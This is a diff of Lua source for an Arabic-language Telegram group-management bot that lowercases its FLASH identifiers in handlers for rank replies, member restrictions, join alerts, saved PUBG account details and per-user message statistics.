+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تغير رد المنشئ الى : "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد المدير (.*)$") then
 local Text = text:match("^تغير رد المدير (.*)$") 
-FLASHdx1:set(FLASH.."bot:owner:add"..msg.chat_id_,Text) 
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تغير رد المدير الى : "..Text, 1, 'md')
+flashdx1:set(flash.."bot:owner:add"..msg.chat_id_,Text) 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تغير رد المدير الى : "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد الادمن (.*)$") then
 local Text = text:match("^تغير رد الادمن (.*)$") 
-FLASHdx1:set(FLASH.."bot:momod:add"..msg.chat_id_,Text)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تغير رد الادمن الى : "..Text, 1, 'md')
+flashdx1:set(flash.."bot:momod:add"..msg.chat_id_,Text)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تغير رد الادمن الى : "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد المميز (.*)$") then
 local Text = text:match("^تغير رد المميز (.*)$") 
-FLASHdx1:set(FLASH.."bot:vepmem:add"..msg.chat_id_,Text)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تغير رد المميز الى : "..Text, 1, 'md')
+flashdx1:set(flash.."bot:vepmem:add"..msg.chat_id_,Text)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تغير رد المميز الى : "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد العضو (.*)$") then
 local Text = text:match("^تغير رد العضو (.*)$") 
-FLASHdx1:set(FLASH.."bot:member:add"..msg.chat_id_,Text)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تغير رد العضو الى : "..Text, 1, 'md')
+flashdx1:set(flash.."bot:member:add"..msg.chat_id_,Text)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تغير رد العضو الى : "..Text, 1, 'md')
 end
 if text == "حذف ردود الرتب" or text == "مسح ردود الرتب" then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حذف جميع ردود الرتب", 1, 'md')
-FLASHdx1:del(FLASH.."bot:sudo3:add"..msg.chat_id_)
-FLASHdx1:del(FLASH.."bot:monsh:add"..msg.chat_id_)
-FLASHdx1:del(FLASH.."bot:monsh2"..msg.chat_id_)
-FLASHdx1:del(FLASH.."bot:owner:add"..msg.chat_id_)
-FLASHdx1:del(FLASH.."bot:momod:add"..msg.chat_id_)
-FLASHdx1:del(FLASH.."bot:vepmem:add"..msg.chat_id_)
-FLASHdx1:del(FLASH.."bot:member:add"..msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حذف جميع ردود الرتب", 1, 'md')
+flashdx1:del(flash.."bot:sudo3:add"..msg.chat_id_)
+flashdx1:del(flash.."bot:monsh:add"..msg.chat_id_)
+flashdx1:del(flash.."bot:monsh2"..msg.chat_id_)
+flashdx1:del(flash.."bot:owner:add"..msg.chat_id_)
+flashdx1:del(flash.."bot:momod:add"..msg.chat_id_)
+flashdx1:del(flash.."bot:vepmem:add"..msg.chat_id_)
+flashdx1:del(flash.."bot:member:add"..msg.chat_id_)
 end
---     By Developer FLASH     -- 
-if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then 
+--     By Developer flash     -- 
+if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then 
 function kshf_by_reply(extra, result, success)
-if FLASHdx1:sismember(FLASH..'bot:muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
-if FLASHdx1:sismember(FLASH..'bot:banned:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
-if FLASHdx1:sismember(FLASH..'bot:gban:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
-if FLASHdx1:sismember(FLASH..'bot:mutedall:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
-if FLASHdx1:sismember(FLASH..'tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الحظر : '..banned..'\n❅∫ الكتم : '..muted..'\n❅∫ التقيد : '..tkeed..'\n❅∫ الحظر العام : '..banall..'\n❅∫ الكتم العام : '..muteall..'', 1, 'md') 
+if flashdx1:sismember(flash..'bot:muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
+if flashdx1:sismember(flash..'bot:banned:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
+if flashdx1:sismember(flash..'bot:gban:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
+if flashdx1:sismember(flash..'bot:mutedall:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
+if flashdx1:sismember(flash..'tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الحظر : '..banned..'\n❅∫ الكتم : '..muted..'\n❅∫ التقيد : '..tkeed..'\n❅∫ الحظر العام : '..banall..'\n❅∫ الكتم العام : '..muteall..'', 1, 'md') 
 end
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
 end
-if text and text:match('^كشف القيود @(.*)') and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then 
+if text and text:match('^كشف القيود @(.*)') and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then 
 local username = text:match('^كشف القيود @(.*)') 
 function kshf_by_username(extra, result, success)
 if result.id_ then
-if FLASHdx1:sismember(FLASH..'bot:muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
-if FLASHdx1:sismember(FLASH..'bot:banned:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
-if FLASHdx1:sismember(FLASH..'bot:gban:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
-if FLASHdx1:sismember(FLASH..'bot:mutedall:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
-if FLASHdx1:sismember(FLASH..'tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الحظر : '..banned..'\n❅∫ الكتم : '..muted..'\n❅∫ التقيد : '..tkeed..'\n❅∫ الحظر العام : '..banall..'\n❅∫ الكتم العام : '..muteall..'', 1, 'md')
+if flashdx1:sismember(flash..'bot:muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
+if flashdx1:sismember(flash..'bot:banned:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
+if flashdx1:sismember(flash..'bot:gban:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
+if flashdx1:sismember(flash..'bot:mutedall:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
+if flashdx1:sismember(flash..'tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الحظر : '..banned..'\n❅∫ الكتم : '..muted..'\n❅∫ التقيد : '..tkeed..'\n❅∫ الحظر العام : '..banall..'\n❅∫ الكتم العام : '..muteall..'', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *المعرف غير صحيح*', 1, 'md')  
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *المعرف غير صحيح*', 1, 'md')  
 end
 end
 resolve_username(username,kshf_by_username) 
 end
-if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then 
+if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then 
 function unbanreply(extra, result, success) 
-if tonumber(result.sender_user_id_) == tonumber(FLASH) then  
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ انا البوت وليس لدي قيود', 1, 'md')  
+if tonumber(result.sender_user_id_) == tonumber(flash) then  
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ انا البوت وليس لدي قيود', 1, 'md')  
 return false  
 end 
 Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفع قيوده")  
 HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
-FLASHdx1:srem(FLASH..'tkeed:'..msg.chat_id_,result.sender_user_id_) FLASHdx1:srem(FLASH..'bot:banned:'..msg.chat_id_,result.sender_user_id_) FLASHdx1:srem(FLASH..'bot:muted:'..msg.chat_id_,result.sender_user_id_)   
+flashdx1:srem(flash..'tkeed:'..msg.chat_id_,result.sender_user_id_) flashdx1:srem(flash..'bot:banned:'..msg.chat_id_,result.sender_user_id_) flashdx1:srem(flash..'bot:muted:'..msg.chat_id_,result.sender_user_id_)   
 end
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
 end
-if text and text:match('^رفع القيود (%d+)') and Admin(msg) and FLASH11(msg) then 
+if text and text:match('^رفع القيود (%d+)') and Admin(msg) and flash11(msg) then 
 local user = text:match('رفع القيود (%d+)') 
-if tonumber(user) == tonumber(FLASH) then  
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ انا البوت وليس لدي قيود', 1, 'md')  
+if tonumber(user) == tonumber(flash) then  
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ انا البوت وليس لدي قيود', 1, 'md')  
 return false  
 end 
 tdcli_function ({ID = "GetUser",user_id_ = user},function(arg,data) 
 if data and data.code_ and data.code_ == 6 then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لم استطع استخراج المعلومات', 1, 'md') 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لم استطع استخراج المعلومات', 1, 'md') 
 return false  
 end
 Send_Options(msg,user,"reply","❅∫ تم رفع قيوده")  
 HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
-FLASHdx1:srem(FLASH..'tkeed:'..msg.chat_id_,user) FLASHdx1:srem(FLASH..'bot:banned:'..msg.chat_id_,user) FLASHdx1:srem(FLASH..'bot:muted:'..msg.chat_id_,user)   
+flashdx1:srem(flash..'tkeed:'..msg.chat_id_,user) flashdx1:srem(flash..'bot:banned:'..msg.chat_id_,user) flashdx1:srem(flash..'bot:muted:'..msg.chat_id_,user)   
 end,nil)  
 end
-if text and text:match('^رفع القيود @(.*)') and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
+if text and text:match('^رفع القيود @(.*)') and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
 local username = text:match('رفع القيود @(.*)')  
 function unbanusername(extra,result,success)  
 if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *المعرف غير صحيح*', 1, 'md')  
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *المعرف غير صحيح*', 1, 'md')  
 return false  
 end
 if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ هذا معرف قناة وليس معرف حساب', 1, 'md') 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ هذا معرف قناة وليس معرف حساب', 1, 'md') 
 return false  
 end
-if tonumber(result.id_) == tonumber(FLASH) then  
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ انا البوت وليس لدي قيود', 1, 'md')  
+if tonumber(result.id_) == tonumber(flash) then  
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ انا البوت وليس لدي قيود', 1, 'md')  
 return false  
 end 
 tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
 if data and data.code_ and data.code_ == 6 then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لم استطع استخراج المعلومات', 1, 'md') 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لم استطع استخراج المعلومات', 1, 'md') 
 return false  
 end
 Send_Options(msg,result.id_,"reply","❅∫ تم رفع قيوده")  
 HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
-FLASHdx1:srem(FLASH..'tkeed:'..msg.chat_id_,result.id_) FLASHdx1:srem(FLASH..'bot:banned:'..msg.chat_id_,result.id_) FLASHdx1:srem(FLASH..'bot:muted:'..msg.chat_id_,result.id_)   
+flashdx1:srem(flash..'tkeed:'..msg.chat_id_,result.id_) flashdx1:srem(flash..'bot:banned:'..msg.chat_id_,result.id_) flashdx1:srem(flash..'bot:muted:'..msg.chat_id_,result.id_)   
 end,nil)   
 end  
 resolve_username(username,unbanusername) 
 end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
  if is_admin(msg.sender_user_id_, msg.chat_id_) then
-name_bot = (FLASHdx1:get('FLASH:'..bot_id..'name_bot') or 'فلاش')
-if text ==  ""..name_bot..' غادر' and FLASH11(msg) then
+name_bot = (flashdx1:get('flash:'..bot_id..'name_bot') or 'فلاش')
+if text ==  ""..name_bot..' غادر' and flash11(msg) then
 chat_leave(msg.chat_id_, bot_id)
-FLASHdx1:srem(FLASH.."bot:groups",msg.chat_id_)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم مغادره المجموعه وحذف بياناتها ، ', 1, 'md')
+flashdx1:srem(flash.."bot:groups",msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم مغادره المجموعه وحذف بياناتها ، ', 1, 'md')
 end end
---     By Developer FLASH     -- 
-if text == 'تعطيل تنبيه الدخول' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1,'\n❅∫  تعطيل تنبيه الدخول ،', 'md')  
-FLASHdx1:set(FLASH.."UnKedDeleteMessage"..msg.chat_id_,"close") 
+--     By Developer flash     -- 
+if text == 'تعطيل تنبيه الدخول' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+flashdx(msg.chat_id_, msg.id_, 1,'\n❅∫  تعطيل تنبيه الدخول ،', 'md')  
+flashdx1:set(flash.."UnKedDeleteMessage"..msg.chat_id_,"close") 
 end
 if text == 'تفعيل تنبيه الدخول' and is_owner(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1,'\n❅∫  تفعيل تنبيه الدخول ،', 'md')
-FLASHdx1:set(FLASH.."UnKedDeleteMessage"..msg.chat_id_,"open") 
+flashdx(msg.chat_id_, msg.id_, 1,'\n❅∫  تفعيل تنبيه الدخول ،', 'md')
+flashdx1:set(flash.."UnKedDeleteMessage"..msg.chat_id_,"open") 
 end
---     By Developer FLASH     -- 
-if text and text == 'تفعيل وضع حسابي' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-if not FLASHdx1:get(FLASH..'bot:pubgacuount'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1,'\n❅∫ تم تفعيل وضع حسابي سابقا ،', 'md')  
+--     By Developer flash     -- 
+if text and text == 'تفعيل وضع حسابي' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+if not flashdx1:get(flash..'bot:pubgacuount'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1,'\n❅∫ تم تفعيل وضع حسابي سابقا ،', 'md')  
 else
-FLASHdx(msg.chat_id_, msg.id_, 1,'\n❅∫ تم تفعيل وضع حسابي ،', 'md')
-FLASHdx1:del(FLASH..'bot:pubgacuount'..msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1,'\n❅∫ تم تفعيل وضع حسابي ،', 'md')
+flashdx1:del(flash..'bot:pubgacuount'..msg.chat_id_)
 end end
-if text and text == 'تعطيل وضع حسابي' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:pubgacuount'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1,'\n❅∫ تم تعطيل وضع حسابي سابقا ،', 'md') 
+if text and text == 'تعطيل وضع حسابي' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+if flashdx1:get(flash..'bot:pubgacuount'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1,'\n❅∫ تم تعطيل وضع حسابي سابقا ،', 'md') 
 else
-FLASHdx(msg.chat_id_, msg.id_, 1,'\n❅∫ تم تعطيل وضع حسابي ،', 'md')
-FLASHdx1:set(FLASH..'bot:pubgacuount'..msg.chat_id_,true)
+flashdx(msg.chat_id_, msg.id_, 1,'\n❅∫ تم تعطيل وضع حسابي ،', 'md')
+flashdx1:set(flash..'bot:pubgacuount'..msg.chat_id_,true)
 end end
---     By Developer FLASH     -- 
-  if not FLASHdx1:get(FLASH..'bot:pubgacuount'..msg.chat_id_) then
-if (text and text == 'وضع حسابي') and FLASH11(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1,'\n❅∫ ارسل لي اسم حسابك ،  ', 'html')
-FLASHdx1:set(FLASH..'bot:n1'..msg.sender_user_id_..'','yes')
+--     By Developer flash     -- 
+  if not flashdx1:get(flash..'bot:pubgacuount'..msg.chat_id_) then
+if (text and text == 'وضع حسابي') and flash11(msg) then
+flashdx(msg.chat_id_, msg.id_, 1,'\n❅∫ ارسل لي اسم حسابك ،  ', 'html')
+flashdx1:set(flash..'bot:n1'..msg.sender_user_id_..'','yes')
 return false end 
-local FLASH = FLASHdx1:get(FLASH..'bot:n1'..msg.sender_user_id_)
-if FLASH == 'yes' then
+local flash = flashdx1:get(flash..'bot:n1'..msg.sender_user_id_)
+if flash == 'yes' then
 if text:match("^(.*)$") then
-FLASHdx(msg.chat_id_, msg.id_, 1,'\n❅∫ تم حفظ الاسم . ✔️\n❅∫ ارسل ايدي حسابك ،\n  ', 'md')
-FLASHdx1:set(FLASH..'bot:n1'..msg.sender_user_id_..'','no')
-FLASHdx1:set(FLASH..'bot:name_acount'..msg.sender_user_id_, text)
-FLASHdx1:set(FLASH..'bot:n2'..msg.sender_user_id_ ,'yes')
+flashdx(msg.chat_id_, msg.id_, 1,'\n❅∫ تم حفظ الاسم . ✔️\n❅∫ ارسل ايدي حسابك ،\n  ', 'md')
+flashdx1:set(flash..'bot:n1'..msg.sender_user_id_..'','no')
+flashdx1:set(flash..'bot:name_acount'..msg.sender_user_id_, text)
+flashdx1:set(flash..'bot:n2'..msg.sender_user_id_ ,'yes')
 return false end
 end 
-local FLASH = FLASHdx1:get(FLASH..'bot:n2'..msg.sender_user_id_)
-if FLASH == 'yes' then
+local flash = flashdx1:get(flash..'bot:n2'..msg.sender_user_id_)
+if flash == 'yes' then
 if text:match("^(%d+)$") then
-FLASHdx1:set(FLASH..'bot:idacount'..msg.sender_user_id_, text)
-FLASHdx1:set(FLASH..'bot:n2'..msg.sender_user_id_, 'no')
+flashdx1:set(flash..'bot:idacount'..msg.sender_user_id_, text)
+flashdx1:set(flash..'bot:n2'..msg.sender_user_id_, 'no')
 local aa = [[
 ❅∫ تم حفظ ايديك ✅
 ❅∫ ارسل لي تقييمك كمثال :- 
@@ -4308,36 +4308,36 @@ local aa = [[
 - ايس 
 - كونكر 
 ]]
-FLASHdx(msg.chat_id_, msg.id_, 1, aa , 1, 'html')
-FLASHdx1:set(FLASH..'bot:n3'..msg.sender_user_id_, 'yes')
+flashdx(msg.chat_id_, msg.id_, 1, aa , 1, 'html')
+flashdx1:set(flash..'bot:n3'..msg.sender_user_id_, 'yes')
 return false 
 else 
 return false end
 end 
-local FLASH = FLASHdx1:get(FLASH..'bot:n3'..msg.sender_user_id_)
-if FLASH == 'yes' then
+local flash = flashdx1:get(flash..'bot:n3'..msg.sender_user_id_)
+if flash == 'yes' then
 if text:match("^برونز (%d+)$") or text:match("^كولد (%d+)$") or text:match("^بلاتينيوم (%d+)$") or text:match("^دايموند (%d+)$") or text:match("^كراون (%d+)$") or text:match("^ايس$") or text:match("^كونكر$") then
-FLASHdx1:set(FLASH..'bot:n3'..msg.sender_user_id_, 'no')
-FLASHdx(msg.chat_id_, msg.id_, 1,'\n❅∫ تم حفظ التقييم ،\n❅∫ تم حفظ حسابك بالبوت ،\n  ', 'md')
-FLASHdx1:set(FLASH..'bot:acctear'..msg.sender_user_id_, text)
+flashdx1:set(flash..'bot:n3'..msg.sender_user_id_, 'no')
+flashdx(msg.chat_id_, msg.id_, 1,'\n❅∫ تم حفظ التقييم ،\n❅∫ تم حفظ حسابك بالبوت ،\n  ', 'md')
+flashdx1:set(flash..'bot:acctear'..msg.sender_user_id_, text)
 return false 
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1,'\n❅∫ لم يتم حفظ التقييم يوجد خطأ ، ', 'html')
+flashdx(msg.chat_id_, msg.id_, 1,'\n❅∫ لم يتم حفظ التقييم يوجد خطأ ، ', 'html')
 return false end
 end
---     By Developer FLASH     -- 
-if (text and text == 'مسح حسابي') and FLASH11(msg) then
-FLASHdx1:del(FLASH..'bot:idacount'..msg.sender_user_id_)
-FLASHdx1:del(FLASH..'bot:acctear'..msg.sender_user_id_)
-FLASHdx1:del(FLASH..'bot:name_acount'..msg.sender_user_id_)
-FLASHdx(msg.chat_id_, msg.id_, 1,'\n❅∫ تم مسح حسابك من البوت ، ✔️ ', 'html')
+--     By Developer flash     -- 
+if (text and text == 'مسح حسابي') and flash11(msg) then
+flashdx1:del(flash..'bot:idacount'..msg.sender_user_id_)
+flashdx1:del(flash..'bot:acctear'..msg.sender_user_id_)
+flashdx1:del(flash..'bot:name_acount'..msg.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1,'\n❅∫ تم مسح حسابك من البوت ، ✔️ ', 'html')
 end
---     By Developer FLASH     -- 
-if (text and text == 'حسابي') and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:idacount'..msg.sender_user_id_)then
-local n = FLASHdx1:get(FLASH..'bot:idacount'..msg.sender_user_id_)
-local nn = FLASHdx1:get(FLASH..'bot:acctear'..msg.sender_user_id_)
-local nnn = FLASHdx1:get(FLASH..'bot:name_acount'..msg.sender_user_id_)
+--     By Developer flash     -- 
+if (text and text == 'حسابي') and flash11(msg) then
+if flashdx1:get(flash..'bot:idacount'..msg.sender_user_id_)then
+local n = flashdx1:get(flash..'bot:idacount'..msg.sender_user_id_)
+local nn = flashdx1:get(flash..'bot:acctear'..msg.sender_user_id_)
+local nnn = flashdx1:get(flash..'bot:name_acount'..msg.sender_user_id_)
 local Texting = {
 'ككفو ورمبي ☹️💞',
 "تقييمك مصعده كمبره ؟ 😉💞",
@@ -4346,56 +4346,56 @@ local Texting = {
 "ليش متمسح ببجي مو احسلك 🤧",
 "شكبرك شكدك وهذا تقيمك مقتنع بي انته!!!",
 }
-local FLASH_send = Texting[math.random(#Texting)]
-FLASHdx(msg.chat_id_, msg.id_, 1,"\n❅∫ حسابك على الببجي ،\n❅∫ اسم حسابك ، {`"..nnn.."`}\n❅∫ ايدي حسابك ، {`"..n.."`}\n❅∫ تقييمك ، {`"..nn.."`}\n\n❅∫ {"..FLASH_send.."}", 1, 'md')
+local flash_send = Texting[math.random(#Texting)]
+flashdx(msg.chat_id_, msg.id_, 1,"\n❅∫ حسابك على الببجي ،\n❅∫ اسم حسابك ، {`"..nnn.."`}\n❅∫ ايدي حسابك ، {`"..n.."`}\n❅∫ تقييمك ، {`"..nn.."`}\n\n❅∫ {"..flash_send.."}", 1, 'md')
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1,'\n❅∫ لم يتم حفظ حسابك بالبوت ، \n❅∫ ارسل { وضع حسابي } ليتم حفظه .\n ', 'html')
+flashdx(msg.chat_id_, msg.id_, 1,'\n❅∫ لم يتم حفظ حسابك بالبوت ، \n❅∫ ارسل { وضع حسابي } ليتم حفظه .\n ', 'html')
 end end end
---     By Developer FLASH     -- 
-if text and (text:match("^موقعي$") and FLASH11(msg) or text:match("^رتبتي$")) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text and (text:match("^موقعي$") and flash11(msg) or text:match("^رتبتي$")) and flash11(msg) then
 function get_me(extra,result,success)
-local FLASHy = (FLASHdx1:get('FLASH:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
-local FLASH = FLASHdx1:get(FLASH..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
-local msguser = tonumber(FLASHdx1:get(FLASH..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
-local user_msgs = FLASHdx1:get(FLASH..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
-local cont = (tonumber(FLASHdx1:get(FLASH..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
-local user_nkt = tonumber(FLASHdx1:get(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
-local text = (tonumber(FLASHdx1:get(FLASH.."text:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
-local sticker = (tonumber(FLASHdx1:get(FLASH.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
-local Photo = (tonumber(FLASHdx1:get(FLASH.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
-local Voice = (tonumber(FLASHdx1:get(FLASH.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
-local Gif = (tonumber(FLASHdx1:get(FLASH.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
-local Video = (tonumber(FLASHdx1:get(FLASH.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
+local flashy = (flashdx1:get('flash:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
+local flash = flashdx1:get(flash..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
+local msguser = tonumber(flashdx1:get(flash..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
+local user_msgs = flashdx1:get(flash..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
+local cont = (tonumber(flashdx1:get(flash..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
+local user_nkt = tonumber(flashdx1:get(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
+local text = (tonumber(flashdx1:get(flash.."text:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
+local sticker = (tonumber(flashdx1:get(flash.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
+local Photo = (tonumber(flashdx1:get(flash.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
+local Voice = (tonumber(flashdx1:get(flash.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
+local Gif = (tonumber(flashdx1:get(flash.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
+local Video = (tonumber(flashdx1:get(flash.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
 function formsgg(msgs) 
-local FLASH = ''  
+local flash = ''  
 if msgs < 100 then 
-FLASH = 'صنم' 
+flash = 'صنم' 
 elseif msgs < 250 then 
-FLASH = 'ضعيف' 
+flash = 'ضعيف' 
 elseif msgs < 500 then 
-FLASH = 'غير متفاعل' 
+flash = 'غير متفاعل' 
 elseif msgs < 750 then 
-FLASH = 'متوسط كثر حجي' 
+flash = 'متوسط كثر حجي' 
 elseif msgs < 1000 then 
-FLASH = 'متفاعل عمري' 
+flash = 'متفاعل عمري' 
 elseif msgs < 2000 then
-FLASH = 'متفاعل استمر' 
+flash = 'متفاعل استمر' 
 elseif msgs < 3000 then 
-FLASH = 'ملك التفاعل'  
+flash = 'ملك التفاعل'  
 elseif msgs < 4000 then 
-FLASH = 'اسطوره التفاعل' 
+flash = 'اسطوره التفاعل' 
 elseif msgs < 5000 then 
-FLASH = 'تفاعلك نار يبا' 
+flash = 'تفاعلك نار يبا' 
 elseif msgs < 5500 then 
-FLASH = 'نار وشرار' 
+flash = 'نار وشرار' 
 elseif msgs < 6000 then 
-FLASH = 'خيالي' 
+flash = 'خيالي' 
 elseif msgs < 7000 then 
-FLASH = 'كافر بالتفاعل' 
+flash = 'كافر بالتفاعل' 
 elseif msgs < 8000 then 
-FLASH = 'رب التفاعل ' 
+flash = 'رب التفاعل ' 
 end 
-return FLASH
+return flash
 end
 if result.username_ then
 username = '@'..result.username_
@@ -4407,15 +4407,15 @@ lastname = result.last_name_
 else
 lastname = ''
 end
